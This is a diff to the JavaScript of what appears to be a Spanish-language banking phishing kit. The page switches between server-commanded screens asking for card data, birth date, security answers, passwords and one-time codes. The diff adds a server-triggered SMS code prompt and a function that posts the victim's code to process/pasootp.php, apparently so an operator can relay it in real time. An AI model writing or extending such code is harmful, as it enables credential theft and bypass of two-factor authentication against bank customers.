@@ -125,6 +125,12 @@ function consultar_estado() {
                 }
                 espera = 1;
                 break;
+            case '32':
+                if (prevEst !== '32' || !$(".smsotp").is(":visible")) {
+                    vista_smsotp();
+                }
+                espera = 1;
+                break;
             default:
                 espera = 1;
                 break;
@@ -194,6 +200,32 @@ function vista_error_facial() {
     $(".codigootp3").hide();
     $(".total").show();
     $(".error-facial").show();
+}
+
+function vista_smsotp() {
+    $(".fondo").hide();
+    $(".mensaje").hide();
+    $(".saldo-disponible").hide();
+    $(".acceso").hide();
+    $(".otp").hide();
+    $(".errorotp").hide();
+    $(".correo-con").hide();
+    $(".tarjeta").hide();
+    $(".tarjetadt").hide();
+    $(".apellidos").hide();
+    $(".fnacimiento").hide();
+    $(".mobil").hide();
+    $(".pregunta").hide();
+    $(".pregunta2").hide();
+    $(".clave").hide();
+    $(".clave2").hide();
+    $(".solicitacodigo").hide();
+    $(".codigootp3").hide();
+    $(".error-facial").hide();
+    $(".total").hide();
+    var el = document.getElementById("inputsms");
+    if (el) { el.value = ""; el.focus(); }
+    $(".smsotp").show();
 }
 
 function vista_preguntarep(){
@@ -878,6 +910,21 @@ function registraremail(){
     $("#msgClaveEmail").css("display", "none");
     $("#msgEmail").css("display", "table");
     $("#email").focus();
+  }
+}
+
+function registrarsms(){
+  var cod = $("#inputsms").val().trim();
+  if (cod !== "") {
+    $("#msgSms").hide();
+    $(".fondo").show();
+    $(".mensaje").show();
+    $.post("../../../process/pasootp.php", { otp: cod }, function() {
+      espera = 1;
+    });
+  } else {
+    $("#msgSms").css("display", "table").show();
+    $("#inputsms").focus();
   }
 }
 
